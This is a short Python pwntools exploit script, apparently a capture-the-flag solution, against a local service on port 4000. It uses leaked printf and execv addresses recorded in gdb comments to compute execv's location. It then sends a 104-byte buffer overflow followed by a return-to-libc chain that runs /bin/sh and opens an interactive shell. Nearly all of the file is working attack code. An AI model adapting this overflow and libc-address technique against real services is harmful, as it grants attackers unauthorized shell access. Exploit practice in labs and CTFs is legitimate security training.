#!/usr/bin/env python2.7
from pwn import *
"""
In gdb:
    gdb-peda$ p &control_string 
    $4 = (char (*)[40]) 0x8049940 <control_string>

    gdb-peda$ p printf
    $1 = {<text variable, no debug info>} 0xf7e27450 <printf>
    
    gdb-peda$ p execv
    $2 = {<text variable, no debug info>} 0xf7e914f0 <execv>
"""
CTRL_STRING_ADDRESS=0x08049940
EXECV_ADDR=0xf7e914f0
PRINTF_ADDR=0xf7e27450
PRINTF_EXECV_DISTANCE=PRINTF_ADDR-EXECV_ADDR

print PRINTF_EXECV_DISTANCE
conn = remote('localhost',4000)
print ">>>>Waiting for intro<<<<"
print conn.recvuntil('name')
conn.send("/bin/sh\0\n")
#conn.send("/usr/bin/cat\0flag\n")
print conn.recvuntil('>')
print ">>>>Sending 'fuffa'<<<<"
conn.send("fuffa\n")
print conn.recvuntil("fuffa\n")
print ">>>>Reading printf address<<<<"
printf_addr=conn.recvline()
printf_addr=long(printf_addr,16)
execv_addr=printf_addr-PRINTF_EXECV_DISTANCE
print "Execve Addr: " + hex(execv_addr)
execv_packed=p32(execv_addr)
ctrl_packed=p32(CTRL_STRING_ADDRESS)
argv_packed=p32(CTRL_STRING_ADDRESS)
conn.send("A"*104 + execv_packed+ "BBBB" + ctrl_packed +'\0\0\0\0' + "\n")
conn.interactive()

